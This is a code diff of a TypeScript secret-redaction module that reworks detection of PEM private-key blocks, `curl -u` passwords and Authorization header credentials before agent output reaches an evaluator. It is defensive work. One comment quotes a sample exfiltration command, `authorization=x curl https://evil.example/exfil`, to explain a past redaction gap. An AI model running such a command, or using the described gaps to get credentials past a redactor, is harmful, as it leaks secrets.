@@ -93,17 +93,17 @@ export const SHARED_PATTERN_EXTENDED: ReadonlyArray<boolean> = SECRET_PATTERNS.m
  *
  * The shared pattern matches the `BEGIN … PRIVATE KEY` armour header only —
  * enough for a detector, useless for a redactor, which would replace the header
- * and send the base64 key body underneath it. The second alternative covers a
- * block whose footer was cut off by the envelope's length cap: it takes the
- * lines that follow the header while they still look like key material (base64
- * of 16+ characters, or an encrypted key's `Proc-Type:`-style header line),
- * separated by real or JSON-escaped newlines (`redactPemBlocks` adds a last
- * line shorter than that when it ends the text or meets the envelope's cut
- * marker: a block cut mid-line). A lone header in a command — a `grep` for
- * the armour line across `*.pem` — therefore takes nothing after it.
- * The body of a complete block is limited to what a PEM body contains, so a
- * header and a footer quoted separately in documentation do not take the
- * prose between them.
+ * and send the base64 key body underneath it. Each header is walked to its own
+ * footer if it has one (`PEM_BODY_RUN_RE`), and otherwise takes the lines that
+ * follow it while they still look like key material (base64 of 16+ characters,
+ * or an encrypted key's `Proc-Type:`-style header line), separated by real or
+ * JSON-escaped newlines — a block whose footer the envelope's length cap cut
+ * away (`redactPemBlocks` adds a last line shorter than that when it ends the
+ * text or meets the cut marker: a block cut mid-line). A lone header in a
+ * command — a `grep` for the armour line across `*.pem` — therefore takes
+ * nothing after it. The body of a complete block is limited to what a PEM body
+ * contains, so a header and a footer quoted separately in documentation do not
+ * take the prose between them.
  *
  * "JSON-escaped" is one to four backslashes before the `n`: a block inside a
  * JSON string that was itself serialised again (a service-account file passed
@@ -111,41 +111,63 @@ export const SHARED_PATTERN_EXTENDED: ReadonlyArray<boolean> = SECRET_PATTERNS.m
  * `\\n`. The count is bounded so a run of backslashes cannot backtrack.
  */
 const PEM_ARMOUR_HEAD = String.raw`-----BEGIN[ A-Z0-9]*PRIVATE KEY(?: BLOCK)?-----`;
-/** The body of a complete block, up to and including its footer. */
-const PEM_TO_FOOTER = String.raw`(?:[A-Za-z0-9+/=\s:,.-]|\\{1,4}[nrt])*?-----END[ A-Z0-9]*PRIVATE KEY(?: BLOCK)?-----`;
+/** Every armour header in the text; the block after each one is measured in code. */
+const PEM_HEADER_RE = new RegExp(PEM_ARMOUR_HEAD, "g");
+/**
+ * The longest run of characters a PEM body may contain, anchored at a header.
+ *
+ * It replaces the lazy `(?:body)*?-----END…` scan the rule used to open with.
+ * That scan read to the end of the string before failing whenever no footer
+ * FOR A PRIVATE KEY followed — from every header in the text, which made a
+ * page of repeated armour lines (a `grep` hit list across a key directory)
+ * quadratic, at up to 576 strings per envelope. Choosing the alternative on
+ * `text.includes("-----END")` only moved the hole: eight characters of an
+ * unrelated `-----END CERTIFICATE-----` put every header back on the lazy
+ * path, and 2 000 characters of armour cost 1.5 ms again.
+ *
+ * A footer is reachable from a header exactly when it starts inside this run,
+ * because a body character is the only thing the lazy scan could cross. The
+ * run is the same for every start position inside it, so it is computed once
+ * per run rather than once per header, and the whole walk stays linear.
+ */
+const PEM_BODY_RUN_RE = /(?:[A-Za-z0-9+/=\s:,.-]|\\{1,4}[nrt])*/y;
 /** The key lines of a block whose footer the envelope's cap cut away. */
 const PEM_TO_CUT = String.raw`(?:(?:\s|\\{1,4}[nrt])+(?:[A-Za-z0-9+/=]{16,}|[A-Za-z-]+:[^\n\\]*))*`;
-const PEM_BLOCK_RE = new RegExp(`${PEM_ARMOUR_HEAD}(?:${PEM_TO_FOOTER}|${PEM_TO_CUT})`, "g");
-/**
- * The same rule with the complete-block alternative removed, for text that has
- * no footer in it ANYWHERE.
- *
- * `PEM_TO_FOOTER` is a lazy scan for `-----END`, so in text with no footer it
- * reads to the end of the string before failing — from every header in it.
- * A page of repeated armour lines (a `grep` hit list across a key directory)
- * is therefore quadratic: 1.5 ms at 2 000 characters, which `buildEnvelope`
- * pays up to 576 times. `indexOf` decides in one pass instead, and when a
- * footer IS present the scan stops at it and `lastIndex` skips the whole block.
- */
-const PEM_HEADER_ONLY_RE = new RegExp(`${PEM_ARMOUR_HEAD}${PEM_TO_CUT}`, "g");
-const PEM_COMPLETE_RE = /-----END[ A-Z0-9]*PRIVATE KEY(?: BLOCK)?-----$/;
+const PEM_TO_CUT_RE = new RegExp(PEM_TO_CUT, "y");
 /**
  * The short tail of a key line a cut split, right after a block that lost its
  * footer. Matched in code at the end of such a block: as an optional group at
- * the end of `PEM_BLOCK_RE` it cost that regex ~8x on every string.
+ * the end of the block regex it cost that regex ~8x on every string.
  */
 const PEM_CUT_FRAGMENT_RE = /(?:\s|\\{1,4}[nrt])+[A-Za-z0-9+/=]{1,15}(?=\s*(?:$|…\[))/y;
 
 /** Every PEM private-key block, whole or cut short, as one marker each. */
 function redactPemBlocks(text: string, counter: { n: number; found: string[] }): string {
   if (!text.includes("-----BEGIN")) return text;
-  const re = text.includes("-----END") ? PEM_BLOCK_RE : PEM_HEADER_ONLY_RE;
+  const footers = pemFooters(text);
+  let fi = 0;
+  // The body run last measured, reused by every header that starts inside it.
+  let runFrom = -1;
+  let runEnd = -1;
   let out = "";
   let last = 0;
-  re.lastIndex = 0;
-  for (let m = re.exec(text); m !== null; m = re.exec(text)) {
-    let end = m.index + m[0].length;
-    if (!PEM_COMPLETE_RE.test(m[0])) {
+  PEM_HEADER_RE.lastIndex = 0;
+  for (let m = PEM_HEADER_RE.exec(text); m !== null; m = PEM_HEADER_RE.exec(text)) {
+    const bodyStart = m.index + m[0].length;
+    while (fi < footers.length && footers[fi].start < bodyStart) fi++;
+    let end = -1;
+    if (fi < footers.length) {
+      if (bodyStart < runFrom || bodyStart > runEnd) {
+        PEM_BODY_RUN_RE.lastIndex = bodyStart;
+        runFrom = bodyStart;
+        runEnd = bodyStart + (PEM_BODY_RUN_RE.exec(text)?.[0].length ?? 0);
+      }
+      if (footers[fi].start <= runEnd) end = footers[fi].end;
+    }
+    if (end < 0) {
+      // No footer this block can reach: take the key lines the cap left.
+      PEM_TO_CUT_RE.lastIndex = bodyStart;
+      end = bodyStart + (PEM_TO_CUT_RE.exec(text)?.[0].length ?? 0);
       PEM_CUT_FRAGMENT_RE.lastIndex = end;
       const f = PEM_CUT_FRAGMENT_RE.exec(text);
       if (f) end += f[0].length;
@@ -154,10 +176,22 @@ function redactPemBlocks(text: string, counter: { n: number; found: string[] }):
     counter.n++;
     counter.found.push(text.slice(m.index, end));
     last = end;
-    re.lastIndex = end;
+    PEM_HEADER_RE.lastIndex = end;
   }
-  re.lastIndex = 0;
+  PEM_HEADER_RE.lastIndex = 0;
   return last === 0 ? text : out + text.slice(last);
+}
+
+/** Where every private-key footer in the text sits, in one pass. */
+function pemFooters(text: string): Array<{ start: number; end: number }> {
+  const out: Array<{ start: number; end: number }> = [];
+  if (!text.includes("-----END")) return out;
+  PEM_FOOTER_RE.lastIndex = 0;
+  for (let m = PEM_FOOTER_RE.exec(text); m !== null; m = PEM_FOOTER_RE.exec(text)) {
+    out.push({ start: m.index, end: m.index + m[0].length });
+  }
+  PEM_FOOTER_RE.lastIndex = 0;
+  return out;
 }
 
 /**
@@ -322,9 +356,23 @@ const URL_CREDENTIALS_RE = /(^|\\[nrt]|[^A-Za-z0-9_.+-])([a-z][a-z0-9+.-]*:\/\/)
  */
 const URL_TOKEN_USERINFO_RE = /(^|\\[nrt]|[^A-Za-z0-9_.+-])([a-z][a-z0-9+.-]*:\/\/)([A-Za-z0-9_.~-]{20,})@/gi;
 
-/** `curl -u user:pass`, both spellings and both separators. */
+/**
+ * `curl -u user:pass`, both spellings, both separators, and with the password
+ * quoted or bare.
+ *
+ *   1  the command, the flag and any quote that opened the whole argument
+ *   2  the user   3  the quote around the password   4  it, quoted   5  it, bare
+ *
+ * The password's own quotes are matched and re-emitted around the marker
+ * rather than dropped with it. A rule that drops them records `'hunter2'` as
+ * the secret it removed, and `scrubKnownSecrets` then looks for a quoted
+ * string that appears nowhere else, so the bare copy of the same password in
+ * the agent's description goes out with the request. Quoting is the ordinary
+ * way to write a password with shell metacharacters in it, and the group that
+ * could not start at a quote missed it entirely.
+ */
 const BASIC_AUTH_FLAG_RE =
-  /(\b(?:curl|wget|http|https|xh|httpie)\b[^\n;&|]*?\s(?:-u|--user|--proxy-user)(?:[ \t]+|=)["']?)([^\s:"']+):([^\s"']+)/g;
+  /(\b(?:curl|wget|http|https|xh|httpie)\b[^\n;&|]*?\s(?:-u|--user|--proxy-user)(?:[ \t]+|=)["']?)([^\s:"']+):(?:(["'])([^\s"']*)\3|([^\s"']+))/g;
 
 /**
  * The HTTP authentication schemes this file knows by name.
@@ -337,56 +385,308 @@ const BASIC_AUTH_FLAG_RE =
  * untouched or — worse — redacts the word and keeps the credential.
  */
 const AUTH_SCHEME_ALT = "bearer|basic|token|bot|apikey|sso-key|ssws|digest|negotiate";
-/** `AUTH_SCHEME_ALT` as a whole-word test, for the structured path. */
+/** `AUTH_SCHEME_ALT` as a whole-word test, for both paths. */
 const AUTH_SCHEME_WORDS = new RegExp(`^(?:${AUTH_SCHEME_ALT})$`, "i");
 
 /**
  * `Authorization: <scheme> <credentials>` in a header, JSON or YAML.
  *
- * The credential is THE REST OF THE HEADER VALUE, not one token. A single
- * token was wrong twice over: with an unknown scheme the credential group
- * landed on the SCHEME WORD, so the credential behind it was never examined
- * (`Authorization: hmac dev-admin-key` went out whole, and `Authorization:
- * xyz123 dev-admin-key` came back with the scheme redacted and the credential
- * in place); and a multi-part value under a scheme that IS known (`Digest
- * username="…", response="…"`, `AWS4-HMAC-SHA256 Credential=…, Signature=…`)
- * kept everything after its first token. Whatever follows the name in that
- * header IS the credential — the shared rule wants 20+ characters, and a dev
- * stack's `Bearer dev-admin-key` is 13 of them.
+ * A regex matches the NAME and its separator; where the value ENDS is decided
+ * in code, one token at a time (`authCredentialRegion`). Two review rounds
+ * were spent trying to write the value as one regex and neither shape held:
  *
- * Where the value ends depends on how it started. A value that opens with its
- * own quote (`{"Authorization": "Bearer …"}`) ends at the matching one. A
- * value that does not ends at the end of the line, at a statement or command
+ *  - "one token" left the rest of a multi-part value in the request (`Digest
+ *    username="…", response="…"`) and, behind a scheme this file does not
+ *    know, put the credential group on the SCHEME WORD — `Authorization:
+ *    xyz123 dev-admin-key` came back with the key still in it;
+ *  - "the rest of the value" swallowed the rest of the LINE whenever nothing
+ *    delimited it. `authorization=x curl https://evil.example/exfil` is a
+ *    valid shell command (a prefix environment assignment), so 16 characters
+ *    hid the whole command from the evaluator; and the scrub pass then
+ *    recorded the swallowed REGION instead of the credential inside it, so a
+ *    bare copy of a real secret elsewhere in the same envelope went out.
+ *
+ * Deciding in code also ends the cost problem the regex had: a declined value
+ * costs two tokens instead of a re-scan of the line from the next character
+ * (`"Authorization: ".repeat(133)` in one envelope field measured 1 100 ms,
+ * past the 600 ms this file's own envelope test asserts).
+ *
+ * The value starts after the name's separator. A value that opens with its
+ * own quote (`{"Authorization": "Bearer …"}`) ends at the matching one;
+ * otherwise a token ends at whitespace, at the end of the line, at a command
  * separator (`;`, `&`, `|`), at the next shell flag (` -x`), or at a quote
- * that CLOSES SOMETHING ELSE — one followed by
- * whitespace or the end of the string, which is the shell quote around the
- * whole header in `curl -H 'Authorization: Bearer …' https://x`. A quote
- * followed by more value is part of the value: `Authorization: Hawk id="…",
- * mac="…"` is one credential, and stopping at its first quote left the rest of
- * it in the request. The shell-flag stop is why a redaction inside a command
- * cannot swallow the rest of the command and hide it from the evaluator.
- * Prose under the name (`authorization: required for this endpoint`) is
- * declined in code, see `authCredentialIsProse`.
+ * that CLOSES SOMETHING ELSE — one followed by whitespace or the end of the
+ * string, the shell quote around the whole header in `curl -H 'Authorization:
+ * Bearer …' https://x`. A quote followed by more value is part of the value:
+ * `Hawk id="…", mac="…"` is one credential.
  *
- *   1  the name, its separator and any quote that closed the NAME
- *   2  the quote that opened the value   3  a known scheme   4  the value
- *   5  a known scheme (unquoted)         6  the value, unquoted
+ * Which tokens are the credential:
  *
- * A backslash escape is consumed as one unit in both value groups, so the
- * `\"` of a value that was JSON-stringified twice does not end it early.
- *
- * `\b` rather than the consumed boundary group the assignment rules use:
- * `authorization` has to match literally right after it, so every position
- * inside a token run fails in one step anyway, and `\b` still finds the name
- * in `x-my-authorization`.
+ *  - behind a KNOWN scheme word, the next token is the credential whatever it
+ *    looks like. `Bearer swordfish for the call` is a credential and two words
+ *    of prose, not prose: a scheme word in front settles the question, and
+ *    asking whether the rest reads like English sent that value to Jev intact.
+ *  - with no known scheme, the first token has to look like a credential
+ *    (`authCredentialToken`) — otherwise the line is code or prose, which is
+ *    what `authorization: str = Header(None)`, `authorization: z.string()`,
+ *    `grep -r authorization: src/` and `authorization: required for this
+ *    endpoint` all are. An unknown SCHEME word (`Hawk`, `hmac`, `NTLM`) is
+ *    allowed in front of such a token and goes into the marker with it, since
+ *    the first word of a value is as likely to be the credential as the rest.
+ *  - the credential continues through an auth-param list (`id="…", mac="…"`)
+ *    and through one further credential-shaped token, and stops there. It
+ *    never runs to the end of the line, so what follows a header in a command
+ *    is still in front of the evaluator.
  */
-const AUTH_VALUE_CHAR = String.raw`(?:\\[\s\S]|[^\r\n])`;
-const AUTHORIZATION_RE = new RegExp(
-  String.raw`\b((?:x-|proxy-)?authorization\\?["']?[ \t]*[:=][ \t]*)` +
-    String.raw`(?:(\\?["'])[ \t]*((?:${AUTH_SCHEME_ALT})[ \t]+)?(${AUTH_VALUE_CHAR}*?)(?=[ \t]*\2)` +
-    String.raw`|((?:${AUTH_SCHEME_ALT})[ \t]+)?(${AUTH_VALUE_CHAR}*?)(?=[ \t]*(?:[\r\n;&|]|\\[nrt]|$)|[ \t]+-|["'](?=[\s;&|]|$)))`,
-  "gi",
-);
+const AUTH_NAME_RE = /\b(?:x-|proxy-)?authorization(?:\\?["'])?[ \t]*(?::=|[:=])[ \t]*/gi;
+/** A plain word that could be an authentication scheme this file does not know. */
+const AUTH_SCHEME_SHAPE_RE = /^[A-Za-z]+(?:-[A-Za-z]+)*$/;
+/** `id="…"`, `Credential=…`: one parameter of a multi-part credential. */
+const AUTH_PARAM_RE = /^[A-Za-z][A-Za-z0-9_.-]*=/;
+/** `dev-admin-key`, `1000.9f3c`: an identifier `tokenLike` reads as a word. */
+const AUTH_COMPOUND_RE = /^[A-Za-z0-9]+(?:[-_.][A-Za-z0-9]+)+$/;
+/** Code, globs and shell syntax. A credential contains none of them. */
+const AUTH_CODE_CHARS = /[()[\]{}<>*?!`$;|]/;
+/** A credential is not a paragraph: what follows this many tokens is not it. */
+const AUTH_MAX_TOKENS = 12;
+
+interface AuthToken {
+  start: number;
+  end: number;
+  text: string;
+}
+
+/**
+ * A marker this file already wrote, as one unit.
+ *
+ * Rules run from the most exact to the most heuristic, so an `Authorization`
+ * value can arrive with part of it already replaced — `Credential=<redacted:AWS
+ * access key ID>/20260922, Signature=…` after the shared floor took the access
+ * key. The marker has spaces in it, so without this the value's tokens are the
+ * marker's WORDS, the auth-param the marker sits in stops looking like one, and
+ * the signature behind it is never reached.
+ */
+const AUTH_MARKER_HEAD = "<redacted:";
+const AUTH_MARKER_RE = /<redacted:[^>]*>/g;
+const withoutMarkers = (s: string): string => s.replace(AUTH_MARKER_RE, "");
+
+/** A token without the shell quotes around it or the punctuation after it. */
+function authBareToken(t: string): string {
+  const s = t.replace(/[,;]+$/, "");
+  const m = /^(["'])([\s\S]*)\1$/.exec(s);
+  return m ? m[2] : s;
+}
+
+/**
+ * Whether the character at `i` ends an unquoted Authorization value.
+ *
+ * The end of the line, a command separator, and the closing bracket of the
+ * structure the header sits in — `{"headers": {"Authorization: <key>"}}` and
+ * `requests.get(url, headers={"Authorization: <key>"})` write the name and
+ * the value inside ONE string, so the credential's last character is followed
+ * by delimiters that belong to the code, not to it. A quote ends the value
+ * when what follows it closes something else (whitespace, a separator, a
+ * bracket or the end of the string); a quote followed by more value is part
+ * of the value, because `Hawk id="…", mac="…"` is one credential.
+ */
+function endsAuthValue(text: string, i: number): boolean {
+  const c = text[i];
+  if (c === undefined) return true;
+  if (c === "\r" || c === "\n" || c === ";" || c === "&" || c === "|") return true;
+  if (c === "}" || c === "]" || c === ")") return true;
+  const next = text[i + 1];
+  if (c === "\\" && (next === "n" || next === "r" || next === "t")) return true;
+  return (c === '"' || c === "'") && (next === undefined || /[\s;&|}\])]/.test(next));
+}
+
+/**
+ * The next whitespace-separated token of an Authorization value, or null where
+ * the value ends. `close` is the quote the value opened with, if any.
+ */
+function nextAuthToken(text: string, from: number, close: string | null): AuthToken | null {
+  let i = from;
+  while (text[i] === " " || text[i] === "\t") i++;
+  // ` -x`: the next shell flag. A redaction inside a command must not swallow
+  // the rest of the command.
+  if (i > from && text[i] === "-") return null;
+  if (close !== null && text.startsWith(close, i)) return null;
+  if (endsAuthValue(text, i)) return null;
+  let j = i;
+  while (j < text.length) {
+    const c = text[j];
+    if (c === "<" && text.startsWith(AUTH_MARKER_HEAD, j)) {
+      const closed = text.indexOf(">", j);
+      if (closed > 0) {
+        j = closed + 1;
+        continue;
+      }
+    }
+    if (c === " " || c === "\t") break;
+    if (close !== null && text.startsWith(close, j)) break;
+    // A backslash escape is one unit, so the `\"` of a value that was
+    // JSON-stringified twice does not end the token.
+    if (c === "\\" && !/[nrt]/.test(text[j + 1] ?? "")) {
+      j += 2;
+      continue;
+    }
+    if (endsAuthValue(text, j)) break;
+    j++;
+  }
+  const end = Math.min(j, text.length);
+  return end > i ? { start: i, end, text: text.slice(i, end) } : null;
+}
+
+/**
+ * Whether a token of an Authorization value is credential-shaped.
+ *
+ * This is the whole false-positive guard for a value with no known scheme in
+ * front of it, and `authorization` is an ordinary identifier: a typed
+ * parameter (`authorization: str = Header(None)`), a schema field
+ * (`authorization: z.string().optional(),`), a struct tag, a grep path
+ * (`grep -r authorization: src/hooks/`) and a sentence under the name all
+ * reach it, and every one of them would otherwise lose the rest of its line
+ * to a marker in what the evaluator is shown.
+ */
+function authCredentialToken(t: string): boolean {
+  const v = authBareToken(t);
+  if (!v || !isLiteral(v)) return false;
+  if (AUTH_CODE_CHARS.test(withoutMarkers(v).replace(/\\(?=["'])/g, ""))) return false;
+  if (v.includes("://")) return false; // a URL; its credentials have their own rules
+  if (AUTH_PARAM_RE.test(v)) return true;
+  // A quote inside a token that is not an auth-param is a delimiter of the
+  // code around it: `{ Authorization: auth, "Content-Type": "application/json" }`
+  // is an object literal, and taking its second key into the marker deletes
+  // the rest of the line from what the evaluator is shown.
+  if (/["']/.test(v)) return false;
+  if (TYPE_WORDS.has(v.toLowerCase()) || looksLikeExpression(v)) return false;
+  if (v.length < 6) return false;
+  // A path says where a credential is kept, not what it is. Base64 keeps its
+  // `/` through the `+` or `=` that comes with it, or through its randomness.
+  if (v.includes("/") && !/[+=]/.test(v) && !looksRandomToken(v)) return false;
+  return tokenLike(v) || AUTH_COMPOUND_RE.test(v);
+}
+
+/**
+ * Where the credential that starts at `first` ends: through an auth-param list
+ * (`Hawk id="…", ts="…", mac="…"`, `Digest username="…", response="…"`) and
+ * through one further credential-shaped token (`xyz123 dev-admin-key`), and no
+ * further. A quoted auth-param value with a space in it (`realm="My Realm"`)
+ * continues too, which is why the quote state is tracked.
+ */
+function authCredentialEnd(text: string, first: AuthToken, close: string | null): number {
+  let end = first.end;
+  let extra = 1;
+  let open = "";
+  const track = (s: string): void => {
+    for (let k = 0; k < s.length; k++) {
+      const c = s[k];
+      if (c === "\\") k++;
+      else if (open === "") {
+        if (c === '"' || c === "'") open = c;
+      } else if (c === open) open = "";
+    }
+  };
+  track(first.text);
+  for (let n = 0; n < AUTH_MAX_TOKENS; n++) {
+    const tok = nextAuthToken(text, end, close);
+    if (tok === null) break;
+    const bare = authBareToken(tok.text);
+    if (open !== "" || (AUTH_PARAM_RE.test(bare) && !AUTH_CODE_CHARS.test(withoutMarkers(bare)))) {
+      // Still inside the credential: another auth-param, or the rest of one
+      // whose quoted value has a space in it (`realm="My Realm"`).
+    } else if (extra > 0 && authCredentialToken(tok.text)) extra--;
+    else break;
+    track(tok.text);
+    end = tok.end;
+  }
+  return end;
+}
+
+/**
+ * The credential in the region, and the sub-tokens inside it.
+ *
+ * `scrubKnownSecrets` searches the rest of the envelope for what a rule
+ * reports, so reporting only the whole region loses the copy of the credential
+ * that travels on its own: `authorization: none API_KEY=<key> deploy` has to
+ * report `<key>` as well, or the copy of it in the agent's description is
+ * still sent.
+ */
+function authRegionSecrets(region: string): string[] {
+  const out: string[] = [];
+  const push = (s: string): void => {
+    if (s && !out.includes(s)) out.push(s);
+  };
+  push(authBareToken(region));
+  for (const piece of region.split(/\s+/)) {
+    const bare = authBareToken(piece);
+    push(bare);
+    const param = /^[A-Za-z][A-Za-z0-9_.-]*=([\s\S]+)$/.exec(bare);
+    if (param) push(authBareToken(param[1]));
+  }
+  return out;
+}
+
+interface AuthRegion {
+  start: number;
+  end: number;
+  label: string;
+}
+
+/** The credential behind an `Authorization` name whose value starts at `at`. */
+function authCredentialRegion(text: string, at: number): AuthRegion | null {
+  let close: string | null = null;
+  let pos = at;
+  const c = text[at];
+  if (c === '"' || c === "'") {
+    close = c;
+    pos = at + 1;
+  } else if (c === "\\" && (text[at + 1] === '"' || text[at + 1] === "'")) {
+    close = text.slice(at, at + 2);
+    pos = at + 2;
+  }
+  const first = nextAuthToken(text, pos, close);
+  if (first === null) return null;
+  const scheme = authBareToken(first.text);
+  if (AUTH_SCHEME_WORDS.test(scheme)) {
+    const cred = nextAuthToken(text, first.end, close);
+    // A reference is not a credential (`Bearer $TOKEN`, and the same value
+    // once more after a JSON escape), and a bare scheme word is not one
+    // either — its token is in the next field.
+    if (cred === null || !isLiteral(authBareToken(cred.text).replace(/^\\+/, ""))) return null;
+    const label = /^bearer$/i.test(scheme) ? "bearer token" : "authorization header";
+    return { start: cred.start, end: authCredentialEnd(text, cred, close), label };
+  }
+  if (authCredentialToken(first.text)) {
+    return { start: first.start, end: authCredentialEnd(text, first, close), label: "authorization header" };
+  }
+  if (AUTH_SCHEME_SHAPE_RE.test(scheme)) {
+    // An unknown scheme word, which goes into the marker with the credential.
+    const cred = nextAuthToken(text, first.end, close);
+    if (cred === null || !authCredentialToken(cred.text)) return null;
+    return { start: first.start, end: authCredentialEnd(text, cred, close), label: "authorization header" };
+  }
+  return null;
+}
+
+/** Every `Authorization` credential in `text`, as one marker each. */
+function redactAuthorizationHeaders(text: string, counter: { n: number; found: string[] }): string {
+  let out = "";
+  let last = 0;
+  AUTH_NAME_RE.lastIndex = 0;
+  for (let m = AUTH_NAME_RE.exec(text); m !== null; m = AUTH_NAME_RE.exec(text)) {
+    const region = authCredentialRegion(text, m.index + m[0].length);
+    // A declined value cannot hide a second `authorization` name: the scan
+    // resumes right after the NAME, not after the value it declined.
+    if (region === null) continue;
+    out += text.slice(last, region.start) + marker(region.label);
+    counter.n++;
+    for (const s of authRegionSecrets(text.slice(region.start, region.end))) counter.found.push(s);
+    last = region.end;
+    AUTH_NAME_RE.lastIndex = region.end;
+  }
+  AUTH_NAME_RE.lastIndex = 0;
+  return last === 0 ? text : out + text.slice(last);
+}
 
 /**
  * A Bearer credential with no `Authorization` in front of it — `"Bearer …"` as a
@@ -745,8 +1045,9 @@ const AUTHORIZATION_FIELD_RE = /^(?:x-|proxy-)?authorization$/i;
  * Returns the redacted value and the credential it removed, or null when the
  * field is not an authorization header, its value or its credential is a
  * reference (`Bearer ${TOKEN}`, `Bearer <token>`, `Hawk ${MAC}`), its value is
- * a bare scheme word, or its value is prose. On a null the caller redacts the
- * string with the text rules instead.
+ * a bare scheme word, or its value is prose under a first word that is not a
+ * scheme this file knows. On a null the caller redacts the string with the
+ * text rules instead.
  */
 export function redactAuthorizationField(name: string, value: string): { text: string; secret: string } | null {
   if (!AUTHORIZATION_FIELD_RE.test(name.trim())) return null;
@@ -756,8 +1057,14 @@ export function redactAuthorizationField(name: string, value: string): { text: s
   if (schemed) {
     const [, first, rest] = schemed;
     if (AUTH_SCHEME_WORDS.test(first)) {
-      // A known scheme introduces the credential, so `rest` IS the credential.
-      if (!isLiteral(rest) || authCredentialIsProse(rest)) return null;
+      // A known scheme introduces the credential, so `rest` IS the credential
+      // — whatever it reads like. Asking whether it reads as prose as well
+      // sent `Bearer swordfish for the call` to Jev verbatim, with
+      // `redactions: 0`: two ordinary words after a letters-only credential
+      // were enough to suppress the whole redaction. Prose does not carry a
+      // scheme word in front of it; prose under the name is the UNKNOWN-word
+      // case below.
+      if (!isLiteral(rest)) return null;
       return { text: `${first} ${marker(/^bearer$/i.test(first) ? "bearer token" : "authorization header")}`, secret: rest };
     }
     // An unknown first word is part of the credential, so the WHOLE value is
@@ -980,35 +1287,19 @@ export function redactSecretsDetailed(text: string): RedactedDetail {
     );
     out = replaceCounting(out, URL_TOKEN_USERINFO_RE, (_m, g) => (tokenLike(g[2]) ? `${g[0]}${g[1]}${marker("URL credentials")}@` : null), c);
   }
-  out = replaceCounting(out, BASIC_AUTH_FLAG_RE, (_m, g) => (isLiteral(g[2]) ? `${g[0]}${g[1]}:${marker("basic auth")}` : null), c);
+  // The password's own quotes go back around the marker, so the secret handed
+  // to the scrub pass is the BARE value — the form its copies elsewhere are in.
   out = replaceCounting(
     out,
-    AUTHORIZATION_RE,
+    BASIC_AUTH_FLAG_RE,
     (_m, g) => {
-      const [head, quote, schemeQuoted, valueQuoted, schemeBare, valueBare] = g;
-      const quoted = quote !== "";
-      const scheme = quoted ? schemeQuoted : schemeBare;
-      const value = quoted ? valueQuoted : valueBare;
-      // A reference is not a credential: `Authorization: Bearer $TOKEN`.
-      if (!value || !isLiteral(value)) return null;
-      // Prose under the name is not a credential either.
-      if (authCredentialIsProse(value)) return null;
-      // With no scheme in front of it the value has to carry the whole
-      // decision, and two shapes are not credentials: a bare scheme word
-      // (`Authorization: Bearer`, whose token is in the next field — it would
-      // otherwise lose "Bearer"), and CODE. `const authorization =
-      // req.headers.authorization;` and `authorization: required` are the
-      // common ones, and `looksLikeExpression` is what the assignment rules
-      // already use to tell an expression from a literal. It costs a bare
-      // one-word alphabetic credential, which nothing else distinguishes from
-      // a word; anything with a digit, a hyphen or a case hump in it
-      // (`dev-admin-key`, which the old token-shape test ALSO declined) is
-      // still redacted.
-      if (!scheme && (AUTH_SCHEME_WORDS.test(value) || looksLikeExpression(value))) return null;
-      return `${head}${quote}${scheme}${marker(/^bearer/i.test(scheme) ? "bearer token" : "authorization header")}`;
+      const quote = g[2];
+      const value = quote === "" ? g[4] : g[3];
+      return isLiteral(value) ? `${g[0]}${g[1]}:${quote}${marker("basic auth")}${quote}` : null;
     },
     c,
   );
+  out = redactAuthorizationHeaders(out, c);
   out = replaceCounting(
     out,
     BEARER_RE,
